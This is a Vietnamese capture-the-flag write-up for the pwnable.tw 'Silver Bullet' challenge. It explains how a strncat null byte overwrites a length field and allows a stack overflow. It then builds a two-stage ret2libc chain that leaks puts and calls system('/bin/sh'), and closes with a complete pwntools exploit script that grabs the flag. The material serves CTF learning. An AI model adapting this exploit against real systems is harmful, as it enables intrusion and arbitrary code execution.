+++
title = 'Pwnable.tw - Silver Bullet'
date = 2026-09-17T11:47:35+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Silver Bullet

`nc chall.pwnable.tw 10103`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Silver_bullet/silver_bullet_patched
Arch:       i386-32-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8046000)
RUNPATH:    b'.'
Stripped:   No
```

Không canary, không PIE, nên chỉ cần tràn được stack là ret2libc. `Full RELRO` chặn ghi GOT nhưng ở đây không cần.

Menu 3 chức năng thao tác trên một struct bullet nằm trên stack của `main`:

```js
bullet + 0x00   description (0x30 bytes)
bullet + 0x30   power (4 bytes)
```

| Option | Hành vi |
|---|---|
| 1 Create | `read` description, `power = strlen(desc)` |
| 2 Power up | `strncat(bullet, buf, 0x30 - power)`, rồi `power += strlen(buf)` |
| 3 Beat | so sánh `hp - power`, thắng thì `main` chạy tới `leave ; ret` |
| 4 Exit | `exit(0)` |

#### Bug - desync giữa `strncat` và `power`

`strncat` luôn ghi thêm một null byte vào cuối chuỗi, nhưng `power` lại được lưu tại `bullet + 0x30` - ngay chỗ null byte đó.

```py
create(b'A' * 47)    # power = 47, desc dài 47
powerup(b'B')        # strncat ghi 'B' tại offset 47 + NUL tại bullet+0x30
                     # rồi power = 1 ghi đè chính NUL đó
```

Sau bước này `power = 1` nhưng `strlen(desc)` đã là **49** (47 + 'B' + byte đầu của `power`). Lần `power_up` tiếp theo được phép ghi `0x30 - 1 = 47` bytes nữa, nối từ `bullet + 0x31` trở đi, tức là tràn qua saved EBP và saved EIP của `main`.

### 2. Khai thác

#### Payload

Chuỗi mới bắt đầu từ `bullet + 0x31`, còn 3 bytes nữa mới hết `power`, nên 3 bytes đầu là rác. Điều này cũng khiến `power` trở thành `0xffffff30` - số âm khi so sánh `signed`, nên `beat` chắc chắn thắng và `main` đi tới `leave ; ret`.

```py
def make_chain(eip, retaddr, arg):
    return (b"\xff\xff\xff" + p32(0x45454545) + p32(eip) + p32(retaddr) + p32(arg)
            ).ljust(47, b"\x90")
```

Chi tiết dễ sai: ta **`ret` vào `puts@plt`** chứ không `call`, nên `puts` coi `[esp]` là địa chỉ trả về và lấy tham số từ `[esp+4]`. Layout phải là `[saved ebp][puts@plt][ret addr][arg]`.

Phải đi qua `beat` mới tới được `leave ; ret`, vì option 4 gọi thẳng `exit(0)`.

#### Stage 1 - leak libc

```py
powerup(make_chain(PUTS_PLT, MAIN, GOT_PUTS))
```

`puts(got.puts)` in địa chỉ thật của `puts` rồi quay về `main` để dùng lại bug lần hai.

```py
leak = u32(r.recvline().strip()[:4])
libc_base = leak - libc.symbols["puts"]
assert libc_base & 0xfff == 0
```

#### Stage 2 - ret2libc

```py
powerup(make_chain(system, 0xdeadbeef, binsh))
```

```bash
[+] puts leak: 0xf75f4140
[+] libc base: 0xf7595000
ID: uid=1000(silver_bullet) gid=1000(silver_bullet) groups=1000(silver_bullet)
FLAG: FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
```

`FLAG: FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}`

```py
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./silver_bullet_patched")
context.log_level = 'info'

libc = ELF("./libc_32.so.6")

PUTS_PLT = 0x80484a8
GOT_PUTS = 0x804afdc
MAIN = 0x8048954

LIBC_PUTS = libc.symbols["puts"]
LIBC_SYSTEM = libc.symbols["system"]
LIBC_BINSH = next(libc.search(b"/bin/sh"))

def make_chain(eip, retaddr, arg):
    c = b"\xff\xff\xff" + p32(0x45454545) + p32(eip) + p32(retaddr) + p32(arg)
    return c.ljust(47, b"\x90")

def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10103)
    return process([exe.path])

def exploit(r):
    # create bullet
    r.sendlineafter(b"Your choice :", b"1")
    r.sendlineafter(b"Give me your description of bullet :", b"A" * 47)
    # power up (1 byte) -> desync, strlen becomes 49
    r.sendlineafter(b"Your choice :", b"2")
    r.sendafter(b"Give me your another description of bullet :", b"B")
    # power up with ROP chain -> overflow
    r.sendlineafter(b"Your choice :", b"2")
    r.sendafter(b"Give me your another description of bullet :",
                make_chain(PUTS_PLT, MAIN, GOT_PUTS))
    # beat -> main leave;ret -> puts(got_puts); return to main
    r.sendlineafter(b"Your choice :", b"3")
    r.recvuntil(b"Try to beat it .....\n")
    r.recvuntil(b"Oh ! You win !!\n")
    leak = u32(r.recvline().strip()[:4])
    log.success(f"puts leak: {leak:#x}")
    libc_base = leak - LIBC_PUTS
    log.success(f"libc base: {libc_base:#x}")
    assert libc_base & 0xfff == 0, f"bad libc base {libc_base:#x}"

    system = libc_base + LIBC_SYSTEM
    binsh = libc_base + LIBC_BINSH
    log.success(f"system: {system:#x}, /bin/sh: {binsh:#x}")

    # stage 2: fresh bullet, overflow to system("/bin/sh")
    r.sendlineafter(b"Your choice :", b"1")
    r.sendlineafter(b"Give me your description of bullet :", b"A" * 47)
    r.sendlineafter(b"Your choice :", b"2")
    r.sendafter(b"Give me your another description of bullet :", b"B")
    r.sendlineafter(b"Your choice :", b"2")
    r.sendafter(b"Give me your another description of bullet :",
                make_chain(system, 0xdeadbeef, binsh))
    r.sendlineafter(b"Your choice :", b"3")
    r.recvuntil(b"Try to beat it .....\n")
    r.recvuntil(b"Oh ! You win !!\n")
    r.sendline(b"cat /home/silver_bullet/flag")
    r.interactive()

if __name__ == "__main__":
    r = conn()
    exploit(r)
```
